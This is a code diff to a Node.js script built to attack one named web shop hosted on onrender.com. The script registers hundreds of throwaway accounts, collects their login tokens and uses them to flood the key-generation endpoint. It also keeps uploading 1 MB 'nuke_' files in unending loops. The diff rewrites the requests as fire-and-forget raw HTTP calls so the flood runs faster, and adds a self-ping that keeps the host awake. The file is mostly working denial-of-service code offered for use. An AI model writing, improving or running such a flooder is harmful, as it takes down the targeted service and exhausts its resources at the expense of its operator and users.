@@ -1,10 +1,56 @@
 const http = require('http');
-const target = process.env.TARGET_URL || 'https://shopaccnqp.onrender.com';
+const https = require('https');
+const { URL } = require('url');
+const targetUrl = process.env.TARGET_URL || 'https://shopaccnqp.onrender.com';
 const port = process.env.PORT || 10000;
 const accCount = parseInt(process.env.ACC_COUNT || '500');
 const bigContent = 'A'.repeat(1048576);
 let reqCount = 0;
 const tokens = [];
+
+const parsedTarget = new URL(targetUrl);
+const isHttps = parsedTarget.protocol === 'https:';
+const transport = isHttps ? https : http;
+
+const makeRequest = (method, path, headers, body) => {
+  return new Promise((resolve, reject) => {
+    const options = {
+      hostname: parsedTarget.hostname,
+      port: parsedTarget.port || (isHttps ? 443 : 80),
+      path: path,
+      method: method,
+      headers: headers,
+    };
+    const req = transport.request(options, (res) => {
+      let data = '';
+      res.on('data', chunk => data += chunk);
+      res.on('end', () => {
+        try {
+          resolve({ status: res.statusCode, body: JSON.parse(data) });
+        } catch (e) {
+          resolve({ status: res.statusCode, body: data });
+        }
+      });
+    });
+    req.on('error', reject);
+    if (body) req.write(body);
+    req.end();
+  });
+};
+
+const quickFire = (method, path, headers, body) => {
+  const options = {
+    hostname: parsedTarget.hostname,
+    port: parsedTarget.port || (isHttps ? 443 : 80),
+    path: path,
+    method: method,
+    headers: headers,
+  };
+  const req = transport.request(options);
+  req.on('error', () => {});
+  if (body) req.write(body);
+  req.end();
+};
 
 const randStr = (len) => {
   const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
@@ -17,14 +63,11 @@ const randPass = () => randStr(8) + '@' + randStr(4);
 
 const spamKey = (token) => {
   const send = () => {
-    fetch(target + '/api/keys/generate', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + token
-      },
-      body: JSON.stringify({ durationMs: 604800000 })
-    }).catch(() => {});
+    const headers = {
+      'Content-Type': 'application/json',
+      'Authorization': 'Bearer ' + token,
+    };
+    quickFire('POST', '/api/keys/generate', headers, JSON.stringify({ durationMs: 604800000 }));
     reqCount++;
     setImmediate(send);
   };
@@ -33,18 +76,15 @@ const spamKey = (token) => {
 
 const spamCode = (token) => {
   const send = () => {
-    fetch(target + '/api/uploads/code', {
-      method: 'POST',
-      headers: {
-        'Content-Type': 'application/json',
-        'Authorization': 'Bearer ' + token
-      },
-      body: JSON.stringify({
-        content: bigContent,
-        filename: 'nuke_' + Date.now() + '_' + randStr(6) + '.txt',
-        note: ''
-      })
-    }).catch(() => {});
+    const headers = {
+      'Content-Type': 'application/json',
+      'Authorization': 'Bearer ' + token,
+    };
+    quickFire('POST', '/api/uploads/code', headers, JSON.stringify({
+      content: bigContent,
+      filename: 'nuke_' + Date.now() + '_' + randStr(6) + '.txt',
+      note: ''
+    }));
     reqCount++;
     setImmediate(send);
   };
@@ -54,19 +94,11 @@ const spamCode = (token) => {
 const registerAndGetToken = async (i) => {
   const username = 'x' + randStr(8) + '_' + i;
   const password = randPass();
+  const headers = { 'Content-Type': 'application/json' };
   try {
-    await fetch(target + '/api/auth/register', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username, password })
-    });
-    const res = await fetch(target + '/api/auth/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username, password })
-    });
-    const data = await res.json();
-    if (data.token) tokens.push(data.token);
+    await makeRequest('POST', '/api/auth/register', headers, JSON.stringify({ username, password }));
+    const loginRes = await makeRequest('POST', '/api/auth/login', headers, JSON.stringify({ username, password }));
+    if (loginRes.body && loginRes.body.token) tokens.push(loginRes.body.token);
   } catch (e) {}
 };
 
@@ -88,6 +120,6 @@ const server = http.createServer((req, res) => {
 server.listen(port, () => {
   startSpam();
   setInterval(() => {
-    fetch(`http://localhost:${port}`).catch(() => {});
+    http.get(`http://localhost:${port}`, () => {}).on('error', () => {});
   }, 600000);
 });
